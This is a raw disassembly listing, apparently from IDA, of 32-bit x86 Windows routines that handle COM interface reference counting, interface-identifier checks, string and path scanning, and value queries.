                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 21Ch
                mov     eax, ds:100C088h
                xor     eax, ebp
                mov     [ebp+var_4], eax
                mov     eax, [ebp+arg_4]
                mov     ecx, [ebp+arg_0]
                and     [ebp+var_21C], 0
                and     [ebp+var_218], 0
                push    esi
                push    edi
                lea     edx, [ebp+var_218]
                push    edx
                lea     edx, [ebp+var_21C]
                push    edx
                push    eax
                push    ecx
                call    dword ptr ds:100101Ch
                mov     esi, eax
                test    esi, esi
                js      loc_13CBD
                mov     eax, [ebp+var_218]
                lea     edx, [ebp+var_214]
                push    edx
                xor     edx, edx
                push    edx
                push    edx
                push    edx
                xor     esi, esi
                and     [ebp+var_214], esi
                mov     ecx, [eax]
                push    0FFFFFFFFh
                push    eax
                call    dword ptr [ecx+24h]
                test    eax, eax
                js      short loc_13C2A
                cmp     [ebp+var_214], esi
                jz      short loc_13C2A
                push    [ebp+var_214]
                call    dword ptr ds:1001248h
                push    eax
                push    [ebp+var_214]
                lea     eax, [ebp+var_20C]
                push    104h
                push    eax
                call    dword ptr ds:1001234h
                push    eax
                call    sub_13959
                xor     eax, eax
                mov     [ebp+var_6], ax
                add     esp, 14h
                lea     eax, [ebp+var_20C]
                push    eax
                call    sub_14180
                add     eax, eax
                cmp     eax, 208h
                jnb     short loc_13C6E
                xor     ecx, ecx
                mov     [ebp+eax+var_20C], cx
                lea     esi, [ebp+var_20C]

loc_13C2A:                              ; CODE XREF: sub_13B58+6F↑j
                                        ; sub_13B58+77↑j
                lea     eax, [ebp+var_20D]
                push    eax
                mov     [ebp+var_20D], 0
                call    dword ptr ds:1001020h
                mov     edi, eax
                test    edi, edi
                jns     short loc_13C73
                push    [ebp+var_214]
                mov     esi, ds:1001244h
                call    esi
                mov     ecx, [ebp+var_218]
                test    ecx, ecx
                jz      short loc_13C62
                mov     eax, [ecx]
                push    ecx
                call    dword ptr [eax+8]

loc_13C62:                              ; CODE XREF: sub_13B58+102↑j
                push    [ebp+var_21C]
                call    esi
                mov     eax, edi
                jmp     short loc_13CDB
; ---------------------------------------------------------------------------

loc_13C6E:                              ; CODE XREF: sub_13B58+C0↑j
                call    sub_1647D

loc_13C73:                              ; CODE XREF: sub_13B58+EA↑j
                cmp     [ebp+var_20D], 1
                jnz     short loc_13C9B
                push    10013F0h
                call    dword ptr ds:1001064h
                test    eax, eax
                jz      short loc_13C9B
                push    1001428h
                push    eax
                call    dword ptr ds:100115Ch
                test    eax, eax
                jnz     short loc_13CA0

loc_13C9B:                              ; CODE XREF: sub_13B58+122↑j
                                        ; sub_13B58+131↑j
                mov     eax, ds:1001254h

loc_13CA0:                              ; CODE XREF: sub_13B58+141↑j
                push    esi
                push    [ebp+var_21C]
                push    [ebp+var_218]
                call    eax
                push    [ebp+var_214]
                mov     esi, eax
                call    dword ptr ds:1001244h

loc_13CBD:                              ; CODE XREF: sub_13B58+45↑j
                mov     eax, [ebp+var_218]
                test    eax, eax
                jz      short loc_13CCD
                mov     ecx, [eax]
                push    eax
                call    dword ptr [ecx+8]

loc_13CCD:                              ; CODE XREF: sub_13B58+16D↑j
                push    [ebp+var_21C]
                call    dword ptr ds:1001244h
                mov     eax, esi

loc_13CDB:                              ; CODE XREF: sub_13B58+114↑j
                mov     ecx, [ebp+var_4]
                pop     edi
                xor     ecx, ebp
                pop     esi
                call    sub_165AB
                leave
                retn    8
sub_13B58       endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_13CF0       proc near               ; CODE XREF: sub_13AC7+80↑p

var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                push    ecx
                and     [ebp+var_8], 0
                and     [ebp+var_4], 0
                push    esi
                lea     eax, [ebp+var_4]
                push    eax
                lea     eax, [ebp+var_8]
                push    eax
                push    [ebp+arg_4]
                push    [ebp+arg_0]
                call    dword ptr ds:100101Ch
                mov     esi, eax
                test    esi, esi
                js      loc_13DA5
                mov     eax, [ebp+var_4]
                mov     ecx, [eax]
                lea     edx, [ebp+arg_0]
                push    edx
                push    eax
                call    dword ptr [ecx+1Ch]
                mov     esi, eax
                test    esi, esi
                js      short loc_13DA5
                lea     eax, [ebp+arg_4+3]
                push    eax
                mov     byte ptr [ebp+arg_4+3], 0
                call    dword ptr ds:1001020h
                mov     esi, eax
                test    esi, esi
                jns     short loc_13D54
                mov     ecx, [ebp+var_4]
                test    ecx, ecx
                jz      short loc_13DB2
                mov     edx, [ecx]
                push    ecx
                call    dword ptr [edx+8]
                jmp     short loc_13DB2
; ---------------------------------------------------------------------------

loc_13D54:                              ; CODE XREF: sub_13CF0+53↑j
                cmp     byte ptr [ebp+arg_4+3], 1
                jnz     short loc_13D7B
                push    10013F0h
                call    dword ptr ds:1001064h
                test    eax, eax
                jz      short loc_13D7B
                push    100140Ch
                push    eax
                call    dword ptr ds:100115Ch
                mov     edx, eax
                test    edx, edx
                jnz     short loc_13D81

loc_13D7B:                              ; CODE XREF: sub_13CF0+68↑j
                                        ; sub_13CF0+77↑j
                mov     edx, ds:100123Ch

loc_13D81:                              ; CODE XREF: sub_13CF0+89↑j
                mov     ecx, [ebp+arg_0]
                push    dword ptr [ecx+14h]
                movzx   eax, word ptr [ecx+1Ah]
                push    dword ptr [ecx+10h]
                push    eax
                movzx   eax, word ptr [ecx+18h]
                push    eax
                push    ecx
                call    edx
                push    [ebp+arg_0]
                mov     esi, eax
                mov     eax, [ebp+var_4]
                mov     ecx, [eax]
                push    eax
                call    dword ptr [ecx+30h]

loc_13DA5:                              ; CODE XREF: sub_13CF0+28↑j
                                        ; sub_13CF0+3F↑j
                mov     eax, [ebp+var_4]
                test    eax, eax
                jz      short loc_13DB2
                mov     ecx, [eax]
                push    eax
                call    dword ptr [ecx+8]

loc_13DB2:                              ; CODE XREF: sub_13CF0+5A↑j
                                        ; sub_13CF0+62↑j ...
                push    [ebp+var_8]
                call    dword ptr ds:1001244h
                mov     eax, esi
                pop     esi
                leave
                retn    8
sub_13CF0       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_13DC7       proc near               ; CODE XREF: sub_142AD+1E↓p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     ecx, [ebp+arg_0]
                xor     eax, eax
                cmp     [ecx], eax
                jnz     short loc_13DED
                cmp     [ecx+4], eax
                jnz     short loc_13DED
                cmp     dword ptr [ecx+8], 0C0h
                jnz     short loc_13DED
                cmp     dword ptr [ecx+0Ch], 46000000h
                jnz     short loc_13DED
                inc     eax

loc_13DED:                              ; CODE XREF: sub_13DC7+C↑j
                                        ; sub_13DC7+11↑j ...
                pop     ebp
                retn    4
sub_13DC7       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_13DF6       proc near               ; CODE XREF: sub_14F7B+1D↓p
                mov     edi, edi
                push    esi
                mov     esi, ecx
                cmp     dword ptr [esi], 0
                jz      short loc_13E38
                push    edi
                mov     edi, [esi+8]
                cmp     edi, [esi+0Ch]
                jnb     short loc_13E2A
                push    ebx

loc_13E0A:                              ; CODE XREF: sub_13DF6+31↓j
                mov     ebx, [edi]
                test    ebx, ebx
                jz      short loc_13E21
                mov     ecx, [ebx+10h]
                test    ecx, ecx
                jz      short loc_13E1D
                mov     eax, [ecx]
                push    ecx
                call    dword ptr [eax+8]

loc_13E1D:                              ; CODE XREF: sub_13DF6+1F↑j
                and     dword ptr [ebx+10h], 0

loc_13E21:                              ; CODE XREF: sub_13DF6+18↑j
                add     edi, 4
                cmp     edi, [esi+0Ch]
                jb      short loc_13E0A
                pop     ebx

loc_13E2A:                              ; CODE XREF: sub_13DF6+11↑j
                lea     eax, [esi+10h]
                push    eax
                call    dword ptr ds:1001044h
                and     dword ptr [esi], 0
                pop     edi

loc_13E38:                              ; CODE XREF: sub_13DF6+8↑j
                pop     esi
                retn
sub_13DF6       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_13E3F       proc near               ; CODE XREF: sub_14F39+34↓p
                                        ; sub_14F7B+F↓p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                push    edi
                mov     edi, ecx
                mov     esi, [edi+8]
                jmp     short loc_13E5C
; ---------------------------------------------------------------------------

loc_13E4D:                              ; CODE XREF: sub_13E3F+20↓j
                mov     eax, [esi]
                test    eax, eax
                jz      short loc_13E59
                push    [ebp+arg_0]
                call    dword ptr [eax+20h]

loc_13E59:                              ; CODE XREF: sub_13E3F+12↑j
                add     esi, 4

loc_13E5C:                              ; CODE XREF: sub_13E3F+C↑j
                cmp     esi, [edi+0Ch]
                jb      short loc_13E4D
                pop     edi
                pop     esi
                pop     ebp
                retn    4
sub_13E3F       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_13E6C       proc near               ; CODE XREF: sub_14E91+7↓p
                mov     edi, edi
                push    esi
                mov     esi, ecx
                push    edi
                xor     eax, eax
                push    6
                pop     ecx
                lea     edi, [esi+10h]
                rep stosd
                mov     [esi+4], eax
                mov     [esi+0Ch], eax
                mov     [esi+8], eax
                mov     ds:100C364h, esi
                lea     ecx, [esi+10h]
                mov     [esi+28h], eax
                call    sub_13998
                test    eax, eax
                jns     short loc_13EA3
                mov     byte ptr ds:100C0E8h, 1
                jmp     short loc_13EAA
; ---------------------------------------------------------------------------

loc_13EA3:                              ; CODE XREF: sub_13E6C+2C↑j
                mov     dword ptr [esi+4], 24h ; '$'

loc_13EAA:                              ; CODE XREF: sub_13E6C+35↑j
                pop     edi
                mov     eax, esi
                pop     esi
                retn
sub_13E6C       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_13EB4       proc near               ; CODE XREF: sub_14F7B+16↓p
                                        ; sub_14F7B+26↓j
                mov     edi, edi
                push    ebx
                push    esi
                mov     esi, ecx
                push    edi
                lea     edi, [esi+4]
                xor     ebx, ebx
                cmp     [edi], ebx
                jz      short loc_13EEC
                cmp     [esi+0Ch], ebx
                jz      short loc_13ED3
                push    edi
                call    dword ptr ds:1001014h
                mov     [esi+0Ch], ebx

loc_13ED3:                              ; CODE XREF: sub_13EB4+13↑j
                mov     ecx, [esi+28h]
                test    ecx, ecx
                jz      short loc_13EE0
                mov     eax, [ecx]
                push    ecx
                call    dword ptr [eax+8]

loc_13EE0:                              ; CODE XREF: sub_13EB4+24↑j
                lea     eax, [esi+10h]
                push    eax
                call    dword ptr ds:1001044h
                mov     [edi], ebx

loc_13EEC:                              ; CODE XREF: sub_13EB4+E↑j
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_13EB4       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
; ---------------------------------------------------------------------------
                mov     eax, [ecx+8]
                retn
; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_13EFE       proc near

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ebx
                mov     ebx, [ebp+arg_0]
                test    ebx, ebx
                jnz     short loc_13F12
                mov     eax, 80004003h
                jmp     short loc_13F47
; ---------------------------------------------------------------------------

loc_13F12:                              ; CODE XREF: sub_13EFE+B↑j
                push    esi
                push    edi
                xor     esi, esi
                lea     edi, [ecx+28h]
                cmp     [edi], esi
                jnz     short loc_13F37
                push    edi
                push    10013E0h
                push    1
                push    esi
                push    10017F0h
                call    dword ptr ds:10012C4h
                mov     esi, eax
                test    esi, esi
                js      short loc_13F43

loc_13F37:                              ; CODE XREF: sub_13EFE+1D↑j
                mov     ecx, [edi]
                mov     [ebx], ecx
                mov     ecx, [edi]
                mov     edx, [ecx]
                push    ecx
                call    dword ptr [edx+4]

loc_13F43:                              ; CODE XREF: sub_13EFE+37↑j
                pop     edi
                mov     eax, esi
                pop     esi

loc_13F47:                              ; CODE XREF: sub_13EFE+12↑j
                pop     ebx
                pop     ebp
                retn    4
sub_13EFE       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_13F51       proc near               ; CODE XREF: sub_13813+12↑p
                                        ; sub_15324+2D↓p

var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                and     [ebp+var_4], 0
                push    esi
                lea     eax, [ebp+var_4]
                push    eax
                call    dword ptr ds:1001010h
                mov     esi, eax
                test    esi, esi
                js      short loc_13FB5
                mov     esi, [ebp+arg_C]
                test    esi, esi
                jz      short loc_13F8B
                jmp     short loc_13F85
; ---------------------------------------------------------------------------

loc_13F75:                              ; CODE XREF: sub_13F51+38↓j
                push    dword ptr [esi+4]
                mov     eax, [ebp+var_4]
                mov     ecx, [eax]
                push    edx
                push    eax
                call    dword ptr [ecx+0Ch]
                add     esi, 8

loc_13F85:                              ; CODE XREF: sub_13F51+22↑j
                mov     edx, [esi]
                test    edx, edx
                jnz     short loc_13F75

loc_13F8B:                              ; CODE XREF: sub_13F51+20↑j
                mov     ecx, [ebp+arg_0]
                push    [ebp+var_4]
                mov     eax, [ecx]
                call    dword ptr [eax+14h]
                mov     esi, eax
                test    esi, esi
                js      short loc_13FB5
                push    [ebp+var_4]
                push    0
                push    [ebp+arg_8]
                push    [ebp+arg_4]
                push    dword ptr ds:100C6D0h
                call    dword ptr ds:1001028h
                mov     esi, eax

loc_13FB5:                              ; CODE XREF: sub_13F51+19↑j
                                        ; sub_13F51+49↑j
                mov     ecx, [ebp+var_4]
                test    ecx, ecx
                jz      short loc_13FC2
                mov     edx, [ecx]
                push    ecx
                call    dword ptr [edx+8]

loc_13FC2:                              ; CODE XREF: sub_13F51+69↑j
                mov     eax, esi
                pop     esi
                leave
                retn    10h
sub_13F51       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_13FCE       proc near               ; CODE XREF: sub_1510E:loc_1518E↓p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, [ebp+arg_0]
                push    edi
                test    esi, esi
                jz      short loc_1400A
                mov     edi, ds:1001294h

loc_13FE2:                              ; CODE XREF: sub_13FCE+3A↓j
                cmp     word ptr [esi], 0
                jz      short loc_1400A
                mov     eax, [ebp+arg_4]
                jmp     short loc_13FFD
; ---------------------------------------------------------------------------

loc_13FED:                              ; CODE XREF: sub_13FCE+31↓j
                movzx   ecx, word ptr [eax]
                test    cx, cx
                jz      short loc_14001
                cmp     [esi], cx
                jz      short loc_14010
                push    eax
                call    edi

loc_13FFD:                              ; CODE XREF: sub_13FCE+1D↑j
                test    eax, eax
                jnz     short loc_13FED

loc_14001:                              ; CODE XREF: sub_13FCE+25↑j
                push    esi
                call    edi
                mov     esi, eax
                test    esi, esi
                jnz     short loc_13FE2

loc_1400A:                              ; CODE XREF: sub_13FCE+C↑j
                                        ; sub_13FCE+18↑j
                xor     eax, eax

loc_1400C:                              ; CODE XREF: sub_13FCE+45↓j
                pop     edi
                pop     esi
                pop     ebp
                retn
; ---------------------------------------------------------------------------

loc_14010:                              ; CODE XREF: sub_13FCE+2A↑j
                push    esi
                call    edi
                jmp     short loc_1400C
sub_13FCE       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1401A       proc near               ; CODE XREF: sub_1510E+39↓p
                                        ; sub_1510E+4E↓p ...

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ebx
                mov     ebx, [ebp+arg_0]
                movzx   eax, word ptr [ebx]
                push    esi
                push    edi
                mov     edi, ds:100128Ch
                push    eax
                call    edi
                movzx   esi, ax
                mov     eax, [ebp+arg_4]
                movzx   eax, word ptr [eax]
                push    eax
                call    edi
                push    20h ; ' '
                pop     edx
                push    9
                movzx   eax, ax
                pop     ecx
                test    si, si
                jz      short loc_1409E

loc_1404B:                              ; CODE XREF: sub_1401A+73↓j
                cmp     si, ax
                jnz     short loc_1408F
                cmp     si, dx
                jz      short loc_1408F
                cmp     si, cx
                jz      short loc_1408F
                push    ebx
                call    dword ptr ds:1001294h
                push    [ebp+arg_4]
                mov     ebx, eax
                call    dword ptr ds:1001294h
                movzx   ecx, word ptr [ebx]
                push    ecx
                mov     [ebp+arg_4], eax
                call    edi
                movzx   esi, ax
                mov     eax, [ebp+arg_4]
                movzx   ecx, word ptr [eax]
                push    ecx
                call    edi
                push    9
                pop     ecx
                push    20h ; ' '
                movzx   eax, ax
                pop     edx
                test    si, si
                jnz     short loc_1404B

loc_1408F:                              ; CODE XREF: sub_1401A+34↑j
                                        ; sub_1401A+39↑j ...
                test    si, si
                jz      short loc_1409E
                cmp     si, dx
                jz      short loc_1409E
                cmp     si, cx
                jnz     short loc_140AD

loc_1409E:                              ; CODE XREF: sub_1401A+2F↑j
                                        ; sub_1401A+78↑j ...
                test    ax, ax
                jz      short loc_140B8
                cmp     ax, dx
                jz      short loc_140B8
                cmp     ax, cx
                jz      short loc_140B8

loc_140AD:                              ; CODE XREF: sub_1401A+82↑j
                cmp     si, ax
                sbb     eax, eax
                and     eax, 0FFFFFFFEh
                inc     eax
                jmp     short loc_140BA
; ---------------------------------------------------------------------------

loc_140B8:                              ; CODE XREF: sub_1401A+87↑j
                                        ; sub_1401A+8C↑j ...
                xor     eax, eax

loc_140BA:                              ; CODE XREF: sub_1401A+9C↑j
                pop     edi
                pop     esi
                pop     ebx
                pop     ebp
                retn
sub_1401A       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_140C4       proc near               ; CODE XREF: sub_14D5F+CC↓p
                                        ; sub_14D5F+DE↓p

var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                lea     eax, [ebp+var_4]
                push    eax
                push    [ebp+arg_4]
                lea     eax, [ebp+arg_4]
                push    eax
                push    0
                push    [ebp+arg_0]
                mov     [ebp+var_4], 4
                push    dword ptr [ecx]
                call    dword ptr ds:1001004h
                test    eax, eax
                jnz     short locret_140FA
                mov     eax, [ebp+arg_4]
                sub     eax, 4
                neg     eax
                sbb     eax, eax
                and     eax, 0Dh

locret_140FA:                           ; CODE XREF: sub_140C4+27↑j
                leave
                retn    8
sub_140C4       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_14103       proc near               ; CODE XREF: sub_14D5F+B6↓p
                                        ; sub_16F0A+25↓p

var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                push    esi
                mov     esi, [ebp+arg_8]
                push    edi
                lea     eax, [ebp+var_4]
                push    eax
                xor     edx, edx
                push    esi
                push    edx
                push    [ebp+arg_4]
                mov     edi, ecx
                mov     ecx, [edi+8]
                push    [ebp+arg_0]
                mov     [ebp+var_4], edx
                test    ecx, ecx
                jz      short loc_1412F
                call    sub_139D8
                jmp     short loc_14135
; ---------------------------------------------------------------------------

loc_1412F:                              ; CODE XREF: sub_14103+23↑j
                call    dword ptr ds:1001000h

loc_14135:                              ; CODE XREF: sub_14103+2A↑j
                mov     ecx, eax
                test    ecx, ecx
                jnz     short loc_14152
                mov     ecx, edi
                call    sub_1415F
                mov     ecx, eax
                mov     eax, [ebp+var_4]
                and     esi, 300h
                mov     [edi], eax
                mov     [edi+4], esi

loc_14152:                              ; CODE XREF: sub_14103+36↑j
                pop     edi
                mov     eax, ecx
                pop     esi
                leave
                retn    0Ch
sub_14103       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_1415F       proc near               ; CODE XREF: sub_14103+3A↑p
                                        ; sub_14D5F+E6↓p ...
                mov     edi, edi
                push    esi
                mov     esi, ecx
                xor     eax, eax
                cmp     [esi], eax
                jz      short loc_14175
                push    dword ptr [esi]
                call    dword ptr ds:1001008h
                and     dword ptr [esi], 0

loc_14175:                              ; CODE XREF: sub_1415F+9↑j
                and     dword ptr [esi+4], 0
                pop     esi
                retn
sub_1415F       endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_14180       proc near               ; CODE XREF: sub_13B58+B4↑p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    edi
                mov     edi, [ebp+arg_0]
                xor     eax, eax
                test    edi, edi
                jz      short loc_141C9
                push    ebx
                push    esi
                mov     esi, edi
                mov     ebx, edi
                cmp     [edi], ax
                jz      short loc_141C1
                xor     edi, edi

loc_1419C:                              ; CODE XREF: sub_14180+3C↓j
                push    ebx
                call    dword ptr ds:1001294h
                movzx   ecx, word ptr [ebx]
                cmp     ecx, 5Ch ; '\'
                jz      short loc_141B5
                cmp     ecx, 2Fh ; '/'
                jz      short loc_141B5
                cmp     ecx, 3Ah ; ':'
                jnz     short loc_141B7

loc_141B5:                              ; CODE XREF: sub_14180+29↑j
                                        ; sub_14180+2E↑j
                mov     esi, eax

loc_141B7:                              ; CODE XREF: sub_14180+33↑j
                mov     ebx, eax
                cmp     [eax], di
                jnz     short loc_1419C
                mov     edi, [ebp+arg_0]

loc_141C1:                              ; CODE XREF: sub_14180+18↑j
                sub     esi, edi
                sar     esi, 1
                mov     eax, esi
                pop     esi
                pop     ebx

loc_141C9:                              ; CODE XREF: sub_14180+D↑j
                pop     edi
                pop     ebp
                retn    4
sub_14180       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
; ---------------------------------------------------------------------------

loc_141D3:                              ; CODE XREF: CODE:0001B192↓j
                mov     edi, edi
                push    esi
                mov     esi, ecx
                cmp     byte ptr [esi+4], 0
                jz      short loc_141EA
                push    dword ptr [esi]
                call    dword ptr ds:1001138h
                mov     byte ptr [esi+4], 0

loc_141EA:                              ; CODE XREF: CODE:000141DC↑j
                pop     esi
                retn
; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_141F1       proc near               ; CODE XREF: sub_14906+E↓p

var_4           = dword ptr -4
arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                mov     ecx, [ecx]
                push    esi
                test    ecx, ecx
                jnz     short loc_14207
                cmp     [ebp+arg_0], ecx
                jnz     short loc_14259
                mov     al, 1
                jmp     short loc_1425B
; ---------------------------------------------------------------------------

loc_14207:                              ; CODE XREF: sub_141F1+B↑j
                mov     esi, [ebp+arg_0]
                test    esi, esi
                jz      short loc_14259
                and     [ebp+arg_0], 0
                and     [ebp+var_4], 0
                mov     eax, [ecx]
                push    ebx
                push    edi
                lea     edx, [ebp+arg_0]
                push    edx
                mov     edi, 100138Ch
                push    edi
                push    ecx
                call    dword ptr [eax]
                mov     eax, [esi]
                lea     ecx, [ebp+var_4]
                push    ecx
                push    edi
                push    esi
                call    dword ptr [eax]
                mov     ecx, [ebp+var_4]
                mov     eax, [ebp+arg_0]
                cmp     eax, ecx
                setz    bl
                test    ecx, ecx
                jz      short loc_14249
                mov     eax, [ecx]
                push    ecx
                call    dword ptr [eax+8]
                mov     eax, [ebp+arg_0]

loc_14249:                              ; CODE XREF: sub_141F1+4D↑j
                test    eax, eax
                jz      short loc_14253
                mov     ecx, [eax]
                push    eax
                call    dword ptr [ecx+8]

loc_14253:                              ; CODE XREF: sub_141F1+5A↑j
                pop     edi
                mov     al, bl
                pop     ebx
                jmp     short loc_1425B
; ---------------------------------------------------------------------------

loc_14259:                              ; CODE XREF: sub_141F1+10↑j
                                        ; sub_141F1+1B↑j
                xor     al, al

loc_1425B:                              ; CODE XREF: sub_141F1+14↑j
                                        ; sub_141F1+66↑j
                pop     esi
                leave
                retn    4
sub_141F1       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
; ---------------------------------------------------------------------------

loc_14265:                              ; CODE XREF: CODE:0001B19D↓j
                                        ; CODE:0001B1A8↓j
                mov     ecx, [ecx]
                test    ecx, ecx
                jz      short locret_14271
                mov     eax, [ecx]
                push    ecx
                call    dword ptr [eax+8]

locret_14271:                           ; CODE XREF: CODE:00014269↑j
                retn
; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_14277       proc near               ; CODE XREF: sub_14318+11↓p
                                        ; sub_154C8+27↓j ...
                add     ecx, 4
                cmp     byte ptr [ecx+18h], 0
                jz      short locret_1428B
                push    ecx
                mov     byte ptr [ecx+18h], 0
                call    dword ptr ds:1001044h

locret_1428B:                           ; CODE XREF: sub_14277+7↑j
                retn
sub_14277       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_14291       proc near               ; CODE XREF: sub_1556A+74↓p
                                        ; sub_156ED+75↓p
                mov     edi, edi
                push    esi
                lea     esi, [ecx+4]
                mov     ecx, esi
                call    sub_13998
                test    eax, eax
                js      short loc_142A6
                mov     byte ptr [esi+18h], 1

loc_142A6:                              ; CODE XREF: sub_14291+F↑j
                pop     esi
                retn
sub_14291       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_142AD       proc near

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, [ebp+arg_C]
                mov     eax, 80004003h
                test    esi, esi
                jz      short loc_142E8
                and     dword ptr [esi], 0
                cmp     [ebp+arg_4], 0
                jz      short loc_142DB
                push    [ebp+arg_8]
                call    sub_13DC7
                test    eax, eax
                jnz     short loc_142DB
                mov     eax, 80040110h
                jmp     short loc_142E8
; ---------------------------------------------------------------------------

loc_142DB:                              ; CODE XREF: sub_142AD+19↑j
                                        ; sub_142AD+25↑j
                mov     eax, [ebp+arg_0]
                push    esi
                push    [ebp+arg_8]
                push    [ebp+arg_4]
                call    dword ptr [eax+24h]

loc_142E8:                              ; CODE XREF: sub_142AD+10↑j
                                        ; sub_142AD+2C↑j
                pop     esi
                pop     ebp
                retn    10h
sub_142AD       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_142F2       proc near

arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                cmp     [ebp+arg_4], 0
                mov     ecx, ds:100C364h
                mov     eax, [ecx]
                jz      short loc_1430A
                call    dword ptr [eax+4]
                jmp     short loc_1430D
; ---------------------------------------------------------------------------

loc_1430A:                              ; CODE XREF: sub_142F2+11↑j
                call    dword ptr [eax+8]

loc_1430D:                              ; CODE XREF: sub_142F2+16↑j
                xor     eax, eax
                pop     ebp
                retn    8
sub_142F2       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_14318       proc near

arg_0           = byte ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, ecx
                lea     ecx, [esi+4]
                mov     dword ptr [esi], 1001440h
                call    sub_14277
                test    [ebp+arg_0], 1
                jz      short loc_1433B
                push    esi
                call    sub_16264
                pop     ecx

loc_1433B:                              ; CODE XREF: sub_14318+1A↑j
                mov     eax, esi
                pop     esi
                pop     ebp
                retn    4
sub_14318       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
; ---------------------------------------------------------------------------
                and     dword ptr [ecx], 0
                and     dword ptr [ecx+4], 0
                or      dword ptr [ecx+8], 0FFFFFFFFh
                mov     eax, ecx
                retn
; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
; ---------------------------------------------------------------------------
                push    dword ptr [ecx]
                call    dword ptr ds:1001244h
                retn
; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_14368       proc near               ; CODE XREF: sub_1461C+27↓p

arg_0           = byte ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                test    [ebp+arg_0], 2
                push    esi
                mov     esi, ecx
                jz      short loc_1439B
                push    edi
                push    1003702h
                lea     edi, [esi-4]
                push    dword ptr [edi]
                push    0Ch
                push    esi
                call    sub_1633C
                test    [ebp+arg_0], 1
                jz      short loc_14396
                push    edi
                call    sub_165A0
                pop     ecx

loc_14396:                              ; CODE XREF: sub_14368+25↑j
                mov     eax, edi
                pop     edi
                jmp     short loc_143B2
; ---------------------------------------------------------------------------

loc_1439B:                              ; CODE XREF: sub_14368+C↑j
                push    dword ptr [esi]
                call    dword ptr ds:1001244h
                test    [ebp+arg_0], 1
                jz      short loc_143B0
                push    esi
                call    sub_16264
                pop     ecx

loc_143B0:                              ; CODE XREF: sub_14368+3F↑j
                mov     eax, esi

loc_143B2:                              ; CODE XREF: sub_14368+31↑j
                pop     esi
                pop     ebp
                retn    4
sub_14368       endp

; ---------------------------------------------------------------------------
